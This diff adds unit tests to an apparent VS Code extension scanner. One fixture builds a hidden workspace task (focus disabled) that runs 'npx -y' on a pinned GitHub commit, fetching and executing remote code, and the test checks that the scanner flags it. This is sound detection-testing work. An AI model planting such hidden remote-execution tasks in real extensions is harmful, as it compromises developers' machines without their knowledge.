@@ -3261,6 +3261,49 @@ class ScannerTests(unittest.TestCase):
         self.assertEqual(finding.evidence["sink"], "workbench.extensions.installExtension")
         self.assertFalse(finding.evidence["integrity_verification"])
 
+    def test_hidden_remote_workspace_task_requires_review(self) -> None:
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "package.json").write_text(
+                '{"publisher":"nrwl","name":"angular-console","version":"18.95.0"}',
+                encoding="utf-8",
+            )
+            (root / "extension.js").write_text(
+                'const vscode=require("vscode");'
+                'const mcpExtensionInstalledSha="nxConsole.mcpExtensionInstalledSha";'
+                'const task=new vscode.Task(vscode.TaskDefinition, vscode.TaskScope.Workspace,'
+                '"install-mcp-extension", "nx",'
+                'new vscode.ShellExecution("npx -y github:nrwl/nx#558b09d7ad0d1660e2a0fb8a06da81a6f42e06d2"));'
+                'task.presentationOptions.focus=!1;',
+                encoding="utf-8",
+            )
+            report = scan_extension(root)
+
+        finding = next(item for item in report.findings if item.rule_id == "hidden-remote-workspace-task")
+        self.assertEqual(report.verdict, "suspicious")
+        self.assertEqual(report.decision, "review")
+        self.assertEqual(finding.evidence["correlation"], "remote-github-execution-plus-hidden-workspace-task")
+        self.assertEqual(finding.evidence["execution_surface"], "ShellExecution")
+
+    def test_normal_visible_github_task_does_not_trigger_hidden_task_rule(self) -> None:
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "package.json").write_text(
+                '{"publisher":"example","name":"workspace-tool","version":"1.0.0"}',
+                encoding="utf-8",
+            )
+            (root / "extension.js").write_text(
+                'const vscode=require("vscode");'
+                'const task=new vscode.Task(vscode.TaskDefinition, vscode.TaskScope.Workspace,'
+                '"install-tool", "workspace-tool",'
+                'new vscode.ShellExecution("npx -y github:example/tool#558b09d7ad0d1660e2a0fb8a06da81a6f42e06d2"));'
+                'task.presentationOptions.focus=true;',
+                encoding="utf-8",
+            )
+            report = scan_extension(root)
+
+        self.assertNotIn("hidden-remote-workspace-task", {item.rule_id for item in report.findings})
+
     def test_unrelated_bundle_download_and_install_do_not_correlate(self) -> None:
         with TemporaryDirectory() as tmp:
             root = Path(tmp)
